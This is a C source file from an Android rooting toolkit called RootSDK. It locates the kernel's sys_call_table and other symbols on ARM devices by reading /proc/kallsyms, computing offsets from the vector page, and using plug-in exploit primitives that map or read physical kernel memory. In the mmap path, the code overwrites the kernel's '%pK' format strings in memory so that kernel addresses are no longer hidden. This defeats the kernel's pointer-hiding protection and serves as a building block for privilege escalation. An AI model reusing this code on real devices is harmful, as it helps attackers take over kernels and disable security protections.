/*****************************************************************************
 * Copyright (C) 2013-2014 Ming Hu tewilove<at>gmail.com
 *
 * This file is part of RootSDK.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/


#include "log.h"
#include "util.h"
#include "kallsyms.h"
#include "ksymbol.h"
#include "kconfig.h"
#include "root.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <unistd.h>

long ksymbol_kallsyms_lookup(const char *sym) {
    long ret = KSYMBOL_LOOKUP_404;
    FILE *fp;
    void *sym_addr;
    char sym_type;
    char sym_name[512];
    int n;

    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        // LOGE("fopen()");
        return KSYMBOL_LOOKUP_500;
    }
    for (;;) {
        // skip unkown
        for (;;) {
            n = fscanf(fp, "%p %c %s\n", &sym_addr, &sym_type, (char *) sym_name);
            if (n)
                break;
            fscanf(fp, "%s\n", (char *) sym_name);
        }
        if (n < 0)
            break;
        if (!strcmp(sym, sym_name)) {
            ret = (long) sym_addr;
            break;
        }
    }
    fclose(fp);
    return ret;
}

/*
    The following code is from entry-common.S.
    Since changes to __sys_trace and __sys_trace_return is nearly impossible in a few years,
    vector_swi + a FIXED SIZE == sys_call_table.
    ...
    ENTRY(vector_swi)
        ...
    ENDPROC(vector_swi)
    __sys_trace:
        ...
    __sys_trace_return:
        ...
    ENTRY(sys_call_table)
    ...
 */

// XXX: those are to be determined
//   CONFIG_ALIGNMENT_TRAP: should be y on modern devices.
//   CONFIG_ARM_THUMB: should be y on modern devices.
//   CONFIG_AEABI: should be y on modern devices.
//   CONFIG_FRAME_POINTER: ???
//   CONFIG_OABI_COMPAT: see /proc/kallsyms or /proc/config.gz.
//   CONFIG_CPU_ENDIAN_BE8: where are BE devices?
//   CONFIG_SECCOMP: /proc/config.gz or prctl(PR_GET_SECCOMP).
//   CONFIG_VECTORS_BASE: who will use address other than 0xffff0000?
//   TIMA_EMUL_ENABLED: seems not enabled yet.

static int get_vector_info(unsigned long *base, unsigned long *size) {
    FILE *fp;
    char buff[512], *test;
    char attr[8], node[8], name[512];
    int rc, bb, ss, t1, t2;

    fp = fopen("/proc/self/maps", "r");
    if (!fp)
        return -1;
    for (;;) {
        test = fgets(buff, sizeof(buff), fp);
        if (!test)
            break;
        rc = sscanf(buff, "%x-%x %s %x %s %d %s", &bb, &ss, attr, &t1, node, &t2, name);
        if (rc < 0)
            break;
        if (rc != 7)
            continue;
        trim(name);
        if (!strcmp(name, "[vectors]")) {
            fclose(fp);
            *base = (unsigned long) bb;
            *size = (unsigned long) ss - (unsigned long) bb;
            return 0;
        }
    }
    fclose(fp);
    return -1;
}

long ksymbol_vector_lookup(int cfg, const char *sym) {
#ifdef __arm__
    int rc, i;
    unsigned long vbase, vsize;
    long instr, dist;
    long vector_swi, sys_call_table;

    // sys_call_table only
    if (strcmp(sym, "sys_call_table"))
        return KSYMBOL_LOOKUP_500;
    // vector from /proc/self/maps
    rc = get_vector_info(&vbase, &vsize);
    if (rc < 0)
        return KSYMBOL_LOOKUP_500;
#if 0
    LOGV("vbase = %x, vsize = %x", vbase, vsize);
    char buff[vsize];
    for (i = 0; i < vsize / sizeof(long); i++) {
        *((long *) buff + i) = *((long *) vbase + i);
    }
    dump("/data/local/tmp/vectors.bin", buff, vsize);
#endif
    // LDR PC, vector_swi
    for (i = 0; i < vsize / sizeof(long); i++) {
        instr = *((long *) vbase + i);
        if ((instr & 0xfffff000) == 0xe59ff000)
            break;
    }
    if (i == vsize / sizeof(long))
        return KSYMBOL_LOOKUP_500;
    // instruction @ (VECTOR_BASE + i * 4) plus ARM + 8
    dist = (instr & 0xfff) + i * 4 + 8;
    if (dist > vsize - 4)
        return KSYMBOL_LOOKUP_500;
    vector_swi = *((long *)(vbase + dist));
    // XXX: wtf, Marvell only?
    vector_swi &= 0xc00fffff;
    LOGV("vector_swi = 0x%08x.", (int) vector_swi);
    // ENTRY(vector_swi):
    sys_call_table = vector_swi;
    // ...
    sys_call_table += 32;
    if (cfg & CONFIG_FRAME_POINTER)
        sys_call_table += 4;
    if (cfg & CONFIG_OABI_COMPAT) {
        if (cfg & CONFIG_ARM_THUMB)
            sys_call_table += 12;
        else
            sys_call_table += 4;
        if (cfg & CONFIG_CPU_ENDIAN_BE8)
            sys_call_table += 4;
    } else if (cfg & CONFIG_AEABI) {
        sys_call_table += 0;
    } else if (cfg & CONFIG_ARM_THUMB) {
        sys_call_table += 12;
    } else {
        sys_call_table += 4;
    }
    if (cfg & CONFIG_ALIGNMENT_TRAP) {
        sys_call_table += 8;
        // XXX: TIMA_EMUL_ENABLED
        sys_call_table += 4;
    }
    // ...
    sys_call_table += 16;
    if (cfg & CONFIG_OABI_COMPAT) {
        sys_call_table += 12;
    } else if (!(cfg & CONFIG_AEABI)) {
        sys_call_table += 8;
    }
    // ...
    sys_call_table += 8;
    if (cfg & CONFIG_SECCOMP)
        sys_call_table += 24;
    // ...
    sys_call_table += 44;
    // ENDPROC(vector_swi)
    // __sys_trace:
    sys_call_table += 44;
    // __sys_trace_return:
    sys_call_table += 24;
    if (cfg & CONFIG_ALIGNMENT_TRAP) {
        // .align 5
        if (sys_call_table & 0x0000001f) {
            sys_call_table |= 0x0000001f;
            sys_call_table += 1;
        }
        // .word cr_alignment
        sys_call_table += 4;
    }
    LOGV("sys_call_table = 0x%08x.", (int) sys_call_table);
    return sys_call_table;
#else
    return 0;
#endif
}

static long ksymbol_exploit_lookup_mmap(exploit_t *exp, const char *sym) {
    int rc;
    long ptr = KSYMBOL_LOOKUP_500;
    long kaddr = 0, ksize = 0;
    ksymbol_static_data_t *me;
    exploit_t *e;

    me = ksymbol_static_lookup();
    if (!me || !me->kernel_size) {
        rc = kernel_paddr_get(&kaddr, &ksize);
        if (rc < 0)
            return -1;
    } else {
        kaddr = me->kernel_pbase;
        ksize = me->kernel_size;
    }
    for (e = exp; e->name; e++) {
        if (!e->mmap)
            continue;
        LOGV("try `%s`.", e->name);
        rc = e->init(&e->opaque);
        if (!rc) {
            void *mapped;
            kallsyms_t ks;

            for (;;) {
                mapped = e->mmap(e->opaque, kaddr, ksize);
                if (mapped == MAP_FAILED)
                    break;
                LOGV("mmap 0x%08x@0x%08x succeeded.", (int) ksize, (int) kaddr);
                // dump("/data/local/tmp/test.dump", mapped, ksize);
                // call libkallsyms

                rc = kallsyms_init(&ks, mapped, ksize);
                if (!rc) {

                    kallsyms_free(&ks);
                } else {
                    void *test;
                    int changed = 0;

                    test = memmem(mapped, ksize, "%pK %c %s\n", 10);
                    if (test) {
                        LOGV("found");
                        *((char *) test + 2) = ' ';
                        changed = -1;
                    }
                    test = memmem(mapped, ksize, "%pK %c %s\t[%s]\n", 15);
                    if (test) {
                        LOGV("found");
                        *((char *) test + 2) = ' ';
                        changed = -1;
                    }
                    if (changed)
                        msync(mapped, ksize, MS_SYNC);
                    ptr = ksymbol_kallsyms_lookup(sym);
                }
                e->free(&e->opaque);
                if (ksymbol_valid(ptr))
                    return ptr;
            }
        }
    }

    return KSYMBOL_LOOKUP_500;
}

static long ksymbol_exploit_lookup_read(exploit_t *exp, const char *sym) {
    int rc;
    long kaddr = 0, ksize = 0;
    ksymbol_static_data_t *me;
    exploit_t *e;
    long *kdata;

    me = ksymbol_static_lookup();
    if (!me || !me->kernel_size) {
        rc = kernel_vaddr_get(&kaddr, &ksize);
        if (rc < 0)
            return -1;
    } else {
        kaddr = me->kernel_vbase;
        ksize = me->kernel_size;
    }
    kdata = (long *) malloc(ksize);
    if (!kdata)
        return KSYMBOL_LOOKUP_500;
    for (e = exp; e->name; e++) {
        if (!e->read32)
            continue;
        rc = e->init(&e->opaque);
        if (!rc) {
            int i;
            long *p = kdata;

            for (i = 0; i < ksize / sizeof(*kdata); i++) {
                rc = e->read32(e->opaque, kaddr + i * sizeof(*kdata), p++);
                if (rc < 0)
                    break;
            }
            if (!rc) {
                LOGV("read 0x%08x@0x%08x succeeded.", (int) ksize, (int) kaddr);
                // XXX: todo
                // call libkallsyms
            }
            e->free(&e->opaque);
        }
    }
    free(kdata);
    return KSYMBOL_LOOKUP_500;
}

long ksymbol_exploit_lookup(exploit_t *exp, const char *sym) {
    long ptr;

    ptr = ksymbol_exploit_lookup_mmap(exp, sym);
    if (ksymbol_valid(ptr))
        return ptr;
    ptr = ksymbol_exploit_lookup_read(exp, sym);
    if (ksymbol_valid(ptr))
        return ptr;
    return KSYMBOL_LOOKUP_500;
}

ksymbol_static_data_t *ksymbol_static_lookup() {
    void *h;
    int (*getprop)(const char *, char *, char *);
    char model[96], displayid[96];
    ksymbol_static_data_t *d = ksymbol_static_data;

    h = dlopen("libcutils.so", RTLD_NOW);
    if (!h) {
        LOGE("dlopen()");
        return 0;
    }
    getprop = (int (*)(const char *, char *, char *)) dlsym(h, "property_get");
    if (!getprop) {
        LOGE("dlsym()");
        dlclose(h);
        return 0;
    }
    memset(model, 0, sizeof(model));
    getprop("ro.product.model", model, NULL);
    memset(displayid, 0, sizeof(displayid));
    getprop("ro.build.display.id", displayid, NULL);
    for (; d->model; d++) {
        if (!strcmp(model, d->model) &&
            !strcmp(displayid, d->displayid))
            break;
    }
    dlclose(h);
    return d->model ? d : 0;
}

static int kernel_paddr_get_iomem(long *addr, long *size) {
    FILE *fp;
    long page_size;
    char line[512];
    int n, gd = 0;
    long tmp_addr = 0, tmp_size = 0;
    char *tmp_name;

    page_size = sysconf(_SC_PAGESIZE);
    fp = fopen("/proc/iomem", "r");
    if (!fp)
        return -1;
    for (;;) {
        int tmp_val1, tmp_val2;

        memset(line, 0, sizeof(line));
        if (!fgets(line, sizeof(line), fp))
            break;
        n = sscanf(line, "%08x-%08x", &tmp_val1, &tmp_val2);
        if (n != 2)
            continue;
        tmp_name = strstr(line, ":");
        if (!tmp_name)
            continue;
        tmp_name += 2;
        if (gd) {
            if (!strncmp(tmp_name, "Kernel code", 11) || !strncmp(tmp_name, "Kernel text", 11)) {
                tmp_addr = tmp_val1 & 0xffff0000;
                continue;
            }
            if (!strncmp(tmp_name, "Kernel data", 11)) {
                int aligned;

                if (!tmp_addr) {
                    tmp_size = 0;
                    gd = 0;
                    continue;
                }
                aligned = (tmp_val2 & ~(page_size - 1));
                aligned = (tmp_val2 == aligned) ? tmp_val2 : (aligned + page_size);
                tmp_size = aligned - tmp_addr;
                break;
            } else {
                tmp_addr = 0;
                tmp_size = 0;
                gd = 0;
                continue;
            }
        } else if (!strncmp(tmp_name, "System RAM", 10)) {
            gd = -1;
            continue;
        }
    }
    fclose(fp);
    if (gd && tmp_addr && tmp_size) {
        *addr = tmp_addr;
        *size = tmp_size;
        return 0;
    }
    return -1;
}

static int kernel_paddr_get_cpuinfo(long *addr, long *size) {
    int rc, impl = -1;
    FILE *fp;
    char key[128];
    char val[128];

    fp = fopen("/proc/cpuinfo", "r");
    if (!fp)
        return -1;
    while ((rc = fscanf(fp, "%[^:]: %[^\n]\n", key, val)) != EOF) {
            if (!strncmp(key, "CPU implementer", 15)) {
                impl = strtol(val, NULL, 16);
                break;
            }
    }
    fclose(fp);
    if (impl == 'Q') {
        *addr = 0x80200000;
        *size = 0x02000000;
        return 0;
    }

    return -1;
}

int kernel_paddr_get(long *addr, long *size) {
    int rc;
    ksymbol_static_data_t *me;

    me = ksymbol_static_lookup();
    if (me && me->kernel_vbase) {
        *addr = me->kernel_pbase;
        *size = me->kernel_size;
        return 0;
    }
    rc = kernel_paddr_get_iomem(addr, size);
    if (!rc)
        return 0;
    rc = kernel_paddr_get_cpuinfo(addr, size);
    if (!rc)
        return 0;
    return -1;
}

int kernel_vaddr_get(long *addr, long *size) {
    int rc;
    ksymbol_static_data_t *me;
    char config_data[12];
    int config_size;

    me = ksymbol_static_lookup();
    if (me && me->kernel_vbase) {
        *addr = me->kernel_vbase;
        *size = me->kernel_size;
        return 0;
    }
    memset(config_data, 0, sizeof(config_data));
    config_size = sizeof(config_data);
    rc = kconfig_get("CONFIG_PAGE_OFFSET", config_data, &config_size);
    if (!rc)
        *addr = strtol(config_data, NULL, 16);
    else {
        *addr = 0xc0000000;
        //LOGV("assume CONFIG_PAGE_OFFSET=%p!", (void *)(*addr));
    }
    *size = 0x00200000;
    return 0;
}

